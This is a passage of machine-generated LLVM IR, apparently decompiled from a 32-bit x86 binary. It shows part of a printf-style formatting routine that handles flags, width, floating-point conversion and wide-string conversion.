  %tmp95 = icmp ult i32 %v3_804a7a6, 6
  br i1 %tmp95, label %dec_label_pc_804a7d4, label %dec_label_pc_804a7ad

dec_label_pc_804a7ad:                             ; preds = %dec_label_pc_804a785
  %v1_804a7ad = inttoptr i32 %v6_804a79c to i8*
  %v2_804a7ad = load i8, i8* %v1_804a7ad, align 1
  %v11_804a7ad = icmp eq i8 %v2_804a7ad, 45
  %v1_804a7b0 = icmp eq i1 %v11_804a7ad, false
  %v1_804a7bf = add i32 %v0_804a7a1, 64
  %v2_804a7bf = inttoptr i32 %v1_804a7bf to i32*
  %v3_804a7bf = load i32, i32* %v2_804a7bf, align 4
  br i1 %v1_804a7b0, label %dec_label_pc_804a7bf, label %dec_label_pc_804a7b2

dec_label_pc_804a7b2:                             ; preds = %dec_label_pc_804a7ad
  %v4_804a7b2 = or i32 %v3_804a7bf, 2
  store i32 %v4_804a7b2, i32* %v2_804a7bf, align 4
  %v0_804a7b7 = load i32, i32* @edi, align 4
  %v1_804a7b7 = add i32 %v0_804a7b7, 1
  store i32 %v1_804a7b7, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_804a7d4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a7d4

dec_label_pc_804a7bf:                             ; preds = %dec_label_pc_804a7ad
  store i32 %v3_804a7bf, i32* %eax.global-to-local, align 4
  %v2_804a7c3 = and i32 %v3_804a7bf, 2
  %v3_804a7c3 = icmp eq i32 %v2_804a7c3, 0
  br i1 %v3_804a7c3, label %dec_label_pc_804a7cb, label %dec_label_pc_804a7c7

dec_label_pc_804a7c7:                             ; preds = %dec_label_pc_804a7bf
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804a7d4

dec_label_pc_804a7cb:                             ; preds = %dec_label_pc_804a7bf
  %v2_804a7cb = urem i32 %v3_804a7bf, 2
  %v3_804a7cb = icmp eq i32 %v2_804a7cb, 0
  br i1 %v3_804a7cb, label %dec_label_pc_804a7d4, label %dec_label_pc_804a7cf

dec_label_pc_804a7cf:                             ; preds = %dec_label_pc_804a7cb
  store i32 4, i32* @ebp, align 4
  br label %dec_label_pc_804a7d4

dec_label_pc_804a7d4:                             ; preds = %dec_label_pc_804a7cb, %dec_label_pc_804a785, %dec_label_pc_804a7c7, %dec_label_pc_804a7b2, %dec_label_pc_804a7cf
  %v0_804a827 = phi i32 [ %v6_804a79c, %dec_label_pc_804a7cb ], [ %v6_804a79c, %dec_label_pc_804a785 ], [ %v6_804a79c, %dec_label_pc_804a7c7 ], [ %v1_804a7b7, %dec_label_pc_804a7b2 ], [ %v6_804a79c, %dec_label_pc_804a7cf ]
  %v0_804a836 = phi i32 [ %v1_804a7a1, %dec_label_pc_804a7cb ], [ %v1_804a7a1, %dec_label_pc_804a785 ], [ %v1_804a7a1, %dec_label_pc_804a7c7 ], [ %v0_804a7d4.pre, %dec_label_pc_804a7b2 ], [ %v1_804a7a1, %dec_label_pc_804a7cf ]
  %v1_804a7d4 = add i32 %v0_804a836, 204
  store i32 %v1_804a7d4, i32* %ecx.global-to-local, align 4
  %v1_804a7db = add i32 %v0_804a836, 20
  %v2_804a7db = inttoptr i32 %v1_804a7db to i32*
  %v3_804a7db = load i32, i32* %v2_804a7db, align 4
  store i32 %v3_804a7db, i32* %edx.global-to-local, align 4
  %v2_804a7df = sub i32 %v1_804a7d4, %v0_804a827
  store i32 %v2_804a7df, i32* %ecx.global-to-local, align 4
  %v2_804a7e1 = icmp slt i32 %v3_804a7db, 0
  %v1_804a7e3 = add i32 %v2_804a7df, 127
  store i32 %v1_804a7e3, i32* @esi, align 4
  %v1_804a7e6 = icmp eq i1 %v2_804a7e1, false
  br i1 %v1_804a7e6, label %dec_label_pc_804a7ed, label %dec_label_pc_804a7e8

dec_label_pc_804a7e8:                             ; preds = %dec_label_pc_804a7d4
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804a7ed

dec_label_pc_804a7ed:                             ; preds = %dec_label_pc_804a7d4, %dec_label_pc_804a7e8
  %v0_804a813 = phi i32 [ %v3_804a7db, %dec_label_pc_804a7d4 ], [ 1, %dec_label_pc_804a7e8 ]
  %v1_804a7ed = add i32 %v0_804a836, 32
  %v2_804a7ed = inttoptr i32 %v1_804a7ed to i8*
  %v3_804a7ed = load i8, i8* %v2_804a7ed, align 1
  %v4_804a7ed = and i8 %v3_804a7ed, 16
  %v5_804a7ed = icmp eq i8 %v4_804a7ed, 0
  br i1 %v5_804a7ed, label %dec_label_pc_804a827, label %dec_label_pc_804a7f4

dec_label_pc_804a7f4:                             ; preds = %dec_label_pc_804a7ed
  %v1_804a7f4 = add i32 %v0_804a836, 48
  %v2_804a7f4 = inttoptr i32 %v1_804a7f4 to i32*
  %v3_804a7f4 = load i32, i32* %v2_804a7f4, align 4
  store i32 %v3_804a7f4, i32* %eax.global-to-local, align 4
  %tmp96 = icmp ult i32 %v3_804a7f4, 3
  br i1 %tmp96, label %dec_label_pc_804a80e.thread, label %dec_label_pc_804a802

dec_label_pc_804a80e.thread:                      ; preds = %dec_label_pc_804a7f4
  store i32 6, i32* @ebp, align 4
  br label %dec_label_pc_804a827

dec_label_pc_804a802:                             ; preds = %dec_label_pc_804a7f4
  %v9_804a802 = icmp eq i32 %v3_804a7f4, 3
  %v1_804a805 = icmp eq i1 %v9_804a802, false
  br i1 %v1_804a805, label %dec_label_pc_804a80e, label %dec_label_pc_804a807

dec_label_pc_804a807:                             ; preds = %dec_label_pc_804a802
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_804a827

dec_label_pc_804a80e:                             ; preds = %dec_label_pc_804a802
  %v9_804a80e = icmp eq i32 %v3_804a7f4, 4
  %v1_804a811 = icmp eq i1 %v9_804a80e, false
  br i1 %v1_804a811, label %dec_label_pc_804a827, label %dec_label_pc_804a813

dec_label_pc_804a813:                             ; preds = %dec_label_pc_804a80e
  %tmp97 = icmp ugt i32 %v0_804a813, %v1_804a7e3
  br i1 %tmp97, label %dec_label_pc_804a827, label %dec_label_pc_804a817

dec_label_pc_804a817:                             ; preds = %dec_label_pc_804a813
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804a81c = inttoptr i32 %v0_804a827 to i8*
  %v2_804a81c = load i8, i8* %v1_804a81c, align 1
  %v8_804a81c = icmp eq i8 %v2_804a81c, 48
  br i1 %v8_804a81c, label %dec_label_pc_804a827, label %dec_label_pc_804a821

dec_label_pc_804a821:                             ; preds = %dec_label_pc_804a817
  %v1_804a821 = add i32 %v2_804a7df, 128
  store i32 %v1_804a821, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804a827

dec_label_pc_804a827:                             ; preds = %dec_label_pc_804a80e.thread, %dec_label_pc_804a813, %dec_label_pc_804a817, %dec_label_pc_804a80e, %dec_label_pc_804a7ed, %dec_label_pc_804a807, %dec_label_pc_804a821
  %v0_804a85f = phi i32 [ %v0_804a813, %dec_label_pc_804a813 ], [ 1, %dec_label_pc_804a817 ], [ %v0_804a813, %dec_label_pc_804a80e ], [ %v0_804a813, %dec_label_pc_804a7ed ], [ %v0_804a813, %dec_label_pc_804a807 ], [ %v1_804a821, %dec_label_pc_804a821 ], [ %v0_804a813, %dec_label_pc_804a80e.thread ]
  %v1_804a827 = inttoptr i32 %v0_804a827 to i8*
  %v2_804a827 = load i8, i8* %v1_804a827, align 1
  %v8_804a827 = icmp eq i8 %v2_804a827, 48
  %v1_804a82a = icmp eq i1 %v8_804a827, false
  br i1 %v1_804a82a, label %dec_label_pc_804a857, label %dec_label_pc_804a82c

dec_label_pc_804a82c:                             ; preds = %dec_label_pc_804a827
  %v0_804a82c = load i32, i32* @ebp, align 4
  %v7_804a82f = icmp sgt i32 %v0_804a82c, 5
  br i1 %v7_804a82f, label %dec_label_pc_804a831, label %dec_label_pc_804a836

dec_label_pc_804a831:                             ; preds = %dec_label_pc_804a82c
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_804a836

dec_label_pc_804a836:                             ; preds = %dec_label_pc_804a82c, %dec_label_pc_804a831
  %v1_804a836 = add i32 %v0_804a836, 48
  %v2_804a836 = inttoptr i32 %v1_804a836 to i32*
  %v3_804a836 = load i32, i32* %v2_804a836, align 4
  %v12_804a836 = icmp eq i32 %v3_804a836, 1
  %v1_804a83b = icmp eq i1 %v12_804a836, false
  br i1 %v1_804a83b, label %dec_label_pc_804a84c, label %dec_label_pc_804a83d

dec_label_pc_804a83d:                             ; preds = %dec_label_pc_804a836
  store i32 ptrtoint ([6 x i8]* @global_var_80515b8.320 to i32), i32* @edi, align 4
  store i32 5, i32* @esi, align 4
  br label %dec_label_pc_804a9c8

dec_label_pc_804a84c:                             ; preds = %dec_label_pc_804a836
  %v1_804a84c = icmp eq i32 %v0_804a85f, 0
  %v1_804a84e = icmp eq i1 %v1_804a84c, false
  br i1 %v1_804a84e, label %dec_label_pc_804a857, label %dec_label_pc_804a850

dec_label_pc_804a850:                             ; preds = %dec_label_pc_804a84c
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804a9c8

dec_label_pc_804a857:                             ; preds = %dec_label_pc_804a84c, %dec_label_pc_804a827
  %v2_804a857 = sub i32 %v0_804a85f, %v1_804a7e3
  %v7_804a857 = icmp ult i32 %v0_804a85f, %v1_804a7e3
  %v12_804a857 = icmp eq i32 %v2_804a857, 0
  %v2_804a859 = or i1 %v7_804a857, %v12_804a857
  br i1 %v2_804a859, label %dec_label_pc_804a9c8, label %dec_label_pc_804a85f

dec_label_pc_804a85f:                             ; preds = %dec_label_pc_804a857
  store i32 %v2_804a857, i32* @ebx, align 4
  br label %dec_label_pc_804a9e2

dec_label_pc_804a868:                             ; preds = %dec_label_pc_804a6fe
  %tmp98 = icmp ult i32 %v3_804a6d0, 16
  br i1 %tmp98, label %dec_label_pc_804a86d, label %dec_label_pc_804a8b2

dec_label_pc_804a86d:                             ; preds = %dec_label_pc_804a868
  %v1_804a86d = add i32 %v0_804a6d0.lcssa, 33
  %v2_804a86d = inttoptr i32 %v1_804a86d to i8*
  %v3_804a86d = load i8, i8* %v2_804a86d, align 1
  %v4_804a86d = and i8 %v3_804a86d, 8
  %v5_804a86d = icmp eq i8 %v4_804a86d, 0
  %v1_804a872 = add i32 %v0_804a6d0.lcssa, 344
  %v2_804a872 = inttoptr i32 %v1_804a872 to i32*
  %v3_804a872 = load i32, i32* %v2_804a872, align 4
  store i32 %v3_804a872, i32* %edx.global-to-local, align 4
  br i1 %v5_804a86d, label %dec_label_pc_804a87f, label %dec_label_pc_804a87b

dec_label_pc_804a87b:                             ; preds = %dec_label_pc_804a86d
  %v1_804a87b = inttoptr i32 %v3_804a872 to x86_fp80*
  %v2_804a87b = load x86_fp80, x86_fp80* %v1_804a87b, align 4
  br label %dec_label_pc_804a881

dec_label_pc_804a87f:                             ; preds = %dec_label_pc_804a86d
  %v1_804a87f = inttoptr i32 %v3_804a872 to double*
  %v2_804a87f = load double, double* %v1_804a87f, align 4
  %v3_804a87f = fpext double %v2_804a87f to x86_fp80
  br label %dec_label_pc_804a881

dec_label_pc_804a881:                             ; preds = %dec_label_pc_804a87b, %dec_label_pc_804a87f
  %storemerge4 = phi x86_fp80 [ %v2_804a87b, %dec_label_pc_804a87b ], [ %v3_804a87f, %dec_label_pc_804a87f ]
  store x86_fp80 %storemerge4, x86_fp80* %st0.global-to-local, align 4
  %v0_804a881 = load i32, i32* @esi, align 4
  %v2_804a881 = add i32 %v0_804a6d0.lcssa, -4
  %v3_804a881 = inttoptr i32 %v2_804a881 to i32*
  store i32 %v0_804a881, i32* %v3_804a881, align 4
  %v0_804a882 = load i32, i32* @esi, align 4
  %v2_804a882 = add i32 %v0_804a6d0.lcssa, -8
  %v3_804a882 = inttoptr i32 %v2_804a882 to i32*
  store i32 %v0_804a882, i32* %v3_804a882, align 4
  %v1_804a883 = add i32 %v0_804a6d0.lcssa, -12
  %v2_804a883 = inttoptr i32 %v1_804a883 to i32*
  store i32 134522182, i32* %v2_804a883, align 4
  %v1_804a888 = add i32 %v0_804a6d0.lcssa, 20
  store i32 %v1_804a888, i32* %eax.global-to-local, align 4
  %v2_804a88c = add i32 %v0_804a6d0.lcssa, -16
  %v3_804a88c = inttoptr i32 %v2_804a88c to i32*
  store i32 %v1_804a888, i32* %v3_804a88c, align 4
  %v1_804a88d = add i32 %v0_804a6d0.lcssa, -28
  %v1_804a890 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_804a890 = inttoptr i32 %v1_804a88d to x86_fp80*
  store x86_fp80 %v1_804a890, x86_fp80* %v3_804a890, align 4
  %v1_804a893 = add i32 %v0_804a6d0.lcssa, 368
  %v2_804a893 = inttoptr i32 %v1_804a893 to i32*
  %v3_804a893 = load i32, i32* %v2_804a893, align 4
  %v5_804a893 = add i32 %v0_804a6d0.lcssa, -32
  %v6_804a893 = inttoptr i32 %v5_804a893 to i32*
  store i32 %v3_804a893, i32* %v6_804a893, align 4
  %v0_804a89a = call i32 @_fpmaxtostr()
  store i32 %v0_804a89a, i32* %eax.global-to-local, align 4
  %v0_804a89f = load i32, i32* @esp, align 4
  %v1_804a89f = add i32 %v0_804a89f, 32
  %v2_804a8a2 = icmp slt i32 %v0_804a89a, 0
  br i1 %v2_804a8a2, label %dec_label_pc_804ab43, label %dec_label_pc_804a8aa

dec_label_pc_804a8aa:                             ; preds = %dec_label_pc_804a881
  %v1_804a8aa = inttoptr i32 %v1_804a89f to i32*
  %v2_804a8aa = load i32, i32* %v1_804a8aa, align 4
  %v4_804a8aa = add i32 %v2_804a8aa, %v0_804a89a
  store i32 %v4_804a8aa, i32* %v1_804a8aa, align 4
  %v0_804ab30.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ab30

dec_label_pc_804a8b2:                             ; preds = %dec_label_pc_804a868
  %tmp99 = or i32 %v3_804a6d0, 1
  %tmp100 = icmp eq i32 %tmp99, 17
  br i1 %tmp100, label %dec_label_pc_804a8bb, label %dec_label_pc_804a94e

dec_label_pc_804a8bb:                             ; preds = %dec_label_pc_804a8b2
  %v9_804a8b2 = icmp eq i32 %v3_804a6d0, 17
  %v1_804a8bb = add i32 %v0_804a6d0.lcssa, 332
  %v2_804a8bb = inttoptr i32 %v1_804a8bb to i32*
  store i32 0, i32* %v2_804a8bb, align 4
  %v0_804a8c6 = load i32, i32* @esp, align 4
  %v1_804a8c6 = add i32 %v0_804a8c6, 344
  %v2_804a8c6 = inttoptr i32 %v1_804a8c6 to i32*
  %v3_804a8c6 = load i32, i32* %v2_804a8c6, align 4
  store i32 %v3_804a8c6, i32* %edx.global-to-local, align 4
  %v1_804a8cd = icmp eq i1 %v9_804a8b2, false
  br i1 %v1_804a8cd, label %dec_label_pc_804a919, label %dec_label_pc_804a8cf

dec_label_pc_804a8cf:                             ; preds = %dec_label_pc_804a8bb
  %v1_804a8cf = inttoptr i32 %v3_804a8c6 to i32*
  %v2_804a8cf = load i32, i32* %v1_804a8cf, align 4
  store i32 %v2_804a8cf, i32* %eax.global-to-local, align 4
  %v2_804a8d1 = add i32 %v0_804a8c6, 340
  %v3_804a8d1 = inttoptr i32 %v2_804a8d1 to i32*
  store i32 %v2_804a8cf, i32* %v3_804a8d1, align 4
  %v0_804a8d8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a8d8 = icmp eq i32 %v0_804a8d8, 0
  br i1 %v1_804a8d8, label %dec_label_pc_804a9cc, label %dec_label_pc_804a8e0

dec_label_pc_804a8e0:                             ; preds = %dec_label_pc_804a8cf
  %v0_804a8e0 = load i32, i32* @esp, align 4
  %v1_804a8e0 = add i32 %v0_804a8e0, 20
  %v2_804a8e0 = inttoptr i32 %v1_804a8e0 to i32*
  %v3_804a8e0 = load i32, i32* %v2_804a8e0, align 4
  store i32 %v3_804a8e0, i32* %eax.global-to-local, align 4
  %v2_804a8e7 = icmp slt i32 %v3_804a8e0, 0
  br i1 %v2_804a8e7, label %dec_label_pc_804a8ed, label %dec_label_pc_804a8eb

dec_label_pc_804a8eb:                             ; preds = %dec_label_pc_804a8e0
  br label %dec_label_pc_804a8ed

dec_label_pc_804a8ed:                             ; preds = %dec_label_pc_804a8e0, %dec_label_pc_804a8eb
  %storemerge104 = phi i32 [ %v3_804a8e0, %dec_label_pc_804a8eb ], [ -1, %dec_label_pc_804a8e0 ]
  store i32 %storemerge104, i32* %ecx.global-to-local, align 4
  %v1_804a8ed = add i32 %v0_804a8e0, 340
  store i32 %v1_804a8ed, i32* %edx.global-to-local, align 4
  %v1_804a8f4 = add i32 %v0_804a8e0, 332
  store i32 %v1_804a8f4, i32* %eax.global-to-local, align 4
  %v2_804a8fb = add i32 %v0_804a8e0, -4
  %v3_804a8fb = inttoptr i32 %v2_804a8fb to i32*
  store i32 %v1_804a8f4, i32* %v3_804a8fb, align 4
  %v0_804a8fc = load i32, i32* %ecx.global-to-local, align 4
  %v2_804a8fc = add i32 %v0_804a8e0, -8
  %v3_804a8fc = inttoptr i32 %v2_804a8fc to i32*
  store i32 %v0_804a8fc, i32* %v3_804a8fc, align 4
  %v0_804a8fd = load i32, i32* %edx.global-to-local, align 4
  %v2_804a8fd = add i32 %v0_804a8e0, -12
  %v3_804a8fd = inttoptr i32 %v2_804a8fd to i32*
  store i32 %v0_804a8fd, i32* %v3_804a8fd, align 4
  %v0_804a8fe = load i32, i32* %edx.global-to-local, align 4
  %v2_804a8fe = add i32 %v0_804a8e0, -16
  %v3_804a8fe = inttoptr i32 %v2_804a8fe to i32*
  store i32 %v0_804a8fe, i32* %v3_804a8fe, align 4
  %v0_804a8ff = call i32 @__GI_wcsrtombs()
  store i32 %v0_804a8ff, i32* %eax.global-to-local, align 4
  %v0_804a904 = load i32, i32* @esp, align 4
  %v1_804a904 = add i32 %v0_804a904, 16
  store i32 %v0_804a8ff, i32* @esi, align 4
  %v10_804a909 = icmp eq i32 %v0_804a8ff, -1
  br i1 %v10_804a909, label %dec_label_pc_804ab43, label %dec_label_pc_804a912

dec_label_pc_804a912:                             ; preds = %dec_label_pc_804a8ed
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804a9d6

dec_label_pc_804a919:                             ; preds = %dec_label_pc_804a8bb
  %v0_804a919 = load i32, i32* @ebx, align 4
  %v2_804a919 = add i32 %v0_804a8c6, -4
  %v3_804a919 = inttoptr i32 %v2_804a919 to i32*
  store i32 %v0_804a919, i32* %v3_804a919, align 4
  %v1_804a91a = add i32 %v0_804a8c6, 332
  store i32 %v1_804a91a, i32* %eax.global-to-local, align 4
  %v2_804a921 = add i32 %v0_804a8c6, -8
  %v3_804a921 = inttoptr i32 %v2_804a921 to i32*
  store i32 %v1_804a91a, i32* %v3_804a921, align 4
  %v0_804a922 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a922 = inttoptr i32 %v0_804a922 to i32*
  %v2_804a922 = load i32, i32* %v1_804a922, align 4
  %v4_804a922 = add i32 %v0_804a8c6, -12
  %v5_804a922 = inttoptr i32 %v4_804a922 to i32*
  store i32 %v2_804a922, i32* %v5_804a922, align 4
  %v1_804a924 = add i32 %v0_804a8c6, 204
  store i32 %v1_804a924, i32* @ebx, align 4
  %v2_804a92b = add i32 %v0_804a8c6, -16
  %v3_804a92b = inttoptr i32 %v2_804a92b to i32*
  store i32 %v1_804a924, i32* %v3_804a92b, align 4
  %v0_804a92c = call i32 @__GI_wcrtomb()
  store i32 %v0_804a92c, i32* %eax.global-to-local, align 4
  %v0_804a931 = load i32, i32* @esp, align 4
  %v1_804a931 = add i32 %v0_804a931, 16
  store i32 %v0_804a92c, i32* @esi, align 4
  %v10_804a936 = icmp eq i32 %v0_804a92c, -1
  br i1 %v10_804a936, label %dec_label_pc_804ab43, label %dec_label_pc_804a93f

dec_label_pc_804a93f:                             ; preds = %dec_label_pc_804a919
  %v0_804a93f = load i32, i32* @ebx, align 4
  store i32 %v0_804a93f, i32* @edi, align 4
  %v2_804a941 = add i32 %v0_804a92c, 220
  %v3_804a941 = add i32 %v2_804a941, %v0_804a931
  %v4_804a941 = inttoptr i32 %v3_804a941 to i8*
  store i8 0, i8* %v4_804a941, align 1
  br label %dec_label_pc_804a9d6

dec_label_pc_804a94e:                             ; preds = %dec_label_pc_804a8b2
  %tmp101 = icmp ult i32 %v3_804a6d0, 20
  br i1 %tmp101, label %dec_label_pc_804a953, label %dec_label_pc_804a99e

dec_label_pc_804a953:                             ; preds = %dec_label_pc_804a94e
  %v9_804a94e = icmp eq i32 %v3_804a6d0, 19
  %v1_804a953 = add i32 %v0_804a6d0.lcssa, 344
  %v2_804a953 = inttoptr i32 %v1_804a953 to i32*
  %v3_804a953 = load i32, i32* %v2_804a953, align 4
  store i32 %v3_804a953, i32* %edx.global-to-local, align 4
  %v1_804a95a = icmp eq i1 %v9_804a94e, false
  %v1_804a97f = inttoptr i32 %v3_804a953 to i32*
  %v2_804a97f = load i32, i32* %v1_804a97f, align 4
  br i1 %v1_804a95a, label %dec_label_pc_804a97f, label %dec_label_pc_804a95c

dec_label_pc_804a95c:                             ; preds = %dec_label_pc_804a953
  store i32 %v2_804a97f, i32* @edi, align 4
  %v1_804a95e = icmp eq i32 %v2_804a97f, 0
  br i1 %v1_804a95e, label %dec_label_pc_804a9cc, label %dec_label_pc_804a962

dec_label_pc_804a962:                             ; preds = %dec_label_pc_804a95c, %dec_label_pc_804a9a7
  %v1_804a96f = phi i32 [ %v0_804a6d0.lcssa, %dec_label_pc_804a95c ], [ %v1_804a9c1, %dec_label_pc_804a9a7 ]
  %v1_804a962 = add i32 %v1_804a96f, 20
  %v2_804a962 = inttoptr i32 %v1_804a962 to i32*
  %v3_804a962 = load i32, i32* %v2_804a962, align 4
  store i32 %v3_804a962, i32* %eax.global-to-local, align 4
  %v2_804a969 = icmp slt i32 %v3_804a962, 0
  br i1 %v2_804a969, label %dec_label_pc_804a96f, label %dec_label_pc_804a96d

dec_label_pc_804a96d:                             ; preds = %dec_label_pc_804a962
  br label %dec_label_pc_804a96f

dec_label_pc_804a96f:                             ; preds = %dec_label_pc_804a962, %dec_label_pc_804a96d
  %storemerge = phi i32 [ %v3_804a962, %dec_label_pc_804a96d ], [ -1, %dec_label_pc_804a962 ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  %v2_804a96f = add i32 %v1_804a96f, -4
  %v3_804a96f = inttoptr i32 %v2_804a96f to i32*
  store i32 %v3_804a6d0, i32* %v3_804a96f, align 4
  %v2_804a970 = add i32 %v1_804a96f, -8
  %v3_804a970 = inttoptr i32 %v2_804a970 to i32*
  store i32 %v3_804a6d0, i32* %v3_804a970, align 4
  %v0_804a971 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a971 = add i32 %v1_804a96f, -12
  %v3_804a971 = inttoptr i32 %v2_804a971 to i32*
  store i32 %v0_804a971, i32* %v3_804a971, align 4
  %v0_804a972 = load i32, i32* @edi, align 4
  %v2_804a972 = add i32 %v1_804a96f, -16
  %v3_804a972 = inttoptr i32 %v2_804a972 to i32*
  store i32 %v0_804a972, i32* %v3_804a972, align 4
  %v0_804a973 = call i32 @strnlen()
  store i32 %v0_804a973, i32* %eax.global-to-local, align 4
  store i32 %v0_804a973, i32* @esi, align 4
  br label %dec_label_pc_804a9d6

dec_label_pc_804a97f:                             ; preds = %dec_label_pc_804a953
  store i32 %v2_804a97f, i32* %eax.global-to-local, align 4
  %v1_804a981 = add i32 %v0_804a6d0.lcssa, 204
  store i32 %v1_804a981, i32* @edi, align 4
  store i32 1, i32* @esi, align 4
  %v1_804a98d = trunc i32 %v2_804a97f to i8
  %v4_804a98d = inttoptr i32 %v1_804a981 to i8*
  store i8 %v1_804a98d, i8* %v4_804a98d, align 1
  %v0_804a994 = load i32, i32* @esp, align 4
  %v1_804a994 = add i32 %v0_804a994, 205
  %v2_804a994 = inttoptr i32 %v1_804a994 to i8*
  store i8 0, i8* %v2_804a994, align 1
  br label %dec_label_pc_804a9d6

dec_label_pc_804a99e:                             ; preds = %dec_label_pc_804a94e
  %v9_804a99e = icmp eq i32 %v3_804a6d0, 20
  %v1_804a9a1 = icmp eq i1 %v9_804a99e, false
  br i1 %v1_804a9a1, label %dec_label_pc_804ab43, label %dec_label_pc_804a9a7

dec_label_pc_804a9a7:                             ; preds = %dec_label_pc_804a99e
  %v0_804a9a7 = load i32, i32* %stack_var_-364, align 4
  %v1_804a9a7 = call i32 @__errno_location(i32 %v0_804a9a7)
  store i32 %v1_804a9a7, i32* %eax.global-to-local, align 4
  %v0_804a9ac = load i32, i32* %edx.global-to-local, align 4
  %v1_804a9ac = load i32, i32* @esp, align 4
  %v2_804a9ac = add i32 %v1_804a9ac, -4
  %v3_804a9ac = inttoptr i32 %v2_804a9ac to i32*
  store i32 %v0_804a9ac, i32* %v3_804a9ac, align 4
  %v1_804a9ad = add i32 %v1_804a9ac, -8
  %v2_804a9ad = inttoptr i32 %v1_804a9ad to i32*
  store i32 128, i32* %v2_804a9ad, align 4
  %v1_804a9b2 = add i32 %v1_804a9ac, 204
  store i32 %v1_804a9b2, i32* %edx.global-to-local, align 4
  %v2_804a9b9 = add i32 %v1_804a9ac, -12
  %v3_804a9b9 = inttoptr i32 %v2_804a9b9 to i32*
  store i32 %v1_804a9b2, i32* %v3_804a9b9, align 4
  %v1_804a9ba = inttoptr i32 %v1_804a9a7 to i32*
  %v2_804a9ba = load i32, i32* %v1_804a9ba, align 4
  %v4_804a9ba = add i32 %v1_804a9ac, -16
  %v5_804a9ba = inttoptr i32 %v4_804a9ba to i32*
  store i32 %v2_804a9ba, i32* %v5_804a9ba, align 4
  %v0_804a9bc = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_804a9bc, i32* %eax.global-to-local, align 4
  %v0_804a9c1 = load i32, i32* @esp, align 4
  %v1_804a9c1 = add i32 %v0_804a9c1, 16
  store i32 %v0_804a9bc, i32* @edi, align 4
  br label %dec_label_pc_804a962

dec_label_pc_804a9c8:                             ; preds = %dec_label_pc_804a857, %dec_label_pc_804a850, %dec_label_pc_804a83d
  %v0_804a9e236 = phi i32 [ %v1_804a7e3, %dec_label_pc_804a857 ], [ 0, %dec_label_pc_804a850 ], [ 5, %dec_label_pc_804a83d ]
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804a9e2

dec_label_pc_804a9cc:                             ; preds = %dec_label_pc_804a95c, %dec_label_pc_804a8cf
  store i32 ptrtoint ([7 x i8]* @global_var_80515be.321 to i32), i32* @edi, align 4
  store i32 6, i32* @esi, align 4
  br label %dec_label_pc_804a9d6

dec_label_pc_804a9d6:                             ; preds = %dec_label_pc_804a97f, %dec_label_pc_804a96f, %dec_label_pc_804a93f, %dec_label_pc_804a912, %dec_label_pc_804a9cc
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v0_804a9dd = load i32, i32* @esp, align 4
  %v1_804a9dd = add i32 %v0_804a9dd, 7
  %v2_804a9dd = inttoptr i32 %v1_804a9dd to i8*
  store i8 32, i8* %v2_804a9dd, align 1
  %v0_804a9e2.pre = load i32, i32* @esi, align 4
  %v1_804a9e2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804a9e2

dec_label_pc_804a9e2:                             ; preds = %dec_label_pc_804a9c8, %dec_label_pc_804a85f, %dec_label_pc_804a9d6
  %v1_804a9e2 = phi i32 [ 0, %dec_label_pc_804a9c8 ], [ %v2_804a857, %dec_label_pc_804a85f ], [ %v1_804a9e2.pre, %dec_label_pc_804a9d6 ]
  %v0_804a9e2 = phi i32 [ %v0_804a9e236, %dec_label_pc_804a9c8 ], [ %v1_804a7e3, %dec_label_pc_804a85f ], [ %v0_804a9e2.pre, %dec_label_pc_804a9d6 ]
  %v2_804a9e2 = add i32 %v0_804a9e2, %v1_804a9e2
  store i32 %v2_804a9e2, i32* @edx, align 4
  %v0_804a9e5 = load i32, i32* @ebp, align 4
  %v9_804a9e5 = icmp eq i32 %v0_804a9e5, 11
  br i1 %v9_804a9e5, label %dec_label_pc_804a9f6, label %dec_label_pc_804a9ea

dec_label_pc_804a9ea:                             ; preds = %dec_label_pc_804a9e2
  %v1_804a9ec = add i32 %v0_804a9e5, -5
  %v6_804a9ec = sub i32 4, %v0_804a9e5
  %v7_804a9ec = and i32 %v6_804a9ec, %v0_804a9e5
  %v8_804a9ec = icmp slt i32 %v7_804a9ec, 0
  %v9_804a9ec = icmp eq i32 %v1_804a9ec, 0
  %v10_804a9ec = icmp slt i32 %v1_804a9ec, 0
  %v3_804a9ef = icmp eq i1 %v10_804a9ec, %v8_804a9ec
  %v4_804a9ef = icmp eq i1 %v9_804a9ec, false
  %v5_804a9ef = and i1 %v4_804a9ef, %v3_804a9ef
  %v6_804a9ef = zext i1 %v5_804a9ef to i32
  store i32 %v6_804a9ef, i32* %eax.global-to-local, align 4
  %v2_804a9f2 = add i32 %v2_804a9e2, 1
  %v3_804a9f2 = add i32 %v2_804a9f2, %v6_804a9ef
  store i32 %v3_804a9f2, i32* @edx, align 4
  br label %dec_label_pc_804a9f6

dec_label_pc_804a9f6:                             ; preds = %dec_label_pc_804a9e2, %dec_label_pc_804a9ea
  %v0_804a9f6 = load i32, i32* @esp, align 4
  %v1_804a9f6 = add i32 %v0_804a9f6, 24
  %v2_804a9f6 = inttoptr i32 %v1_804a9f6 to i32*
  %v3_804a9f6 = load i32, i32* %v2_804a9f6, align 4
  store i32 %v3_804a9f6, i32* %eax.global-to-local, align 4
  %v1_804a9fa = add i32 %v0_804a9f6, 8
  %v2_804a9fa = inttoptr i32 %v1_804a9fa to i32*
  store i32 0, i32* %v2_804a9fa, align 4
  %v0_804aa02 = load i32, i32* %eax.global-to-local, align 4
  %v1_804aa02 = load i32, i32* @edx, align 4
  %v2_804aa02 = sub i32 %v0_804aa02, %v1_804aa02
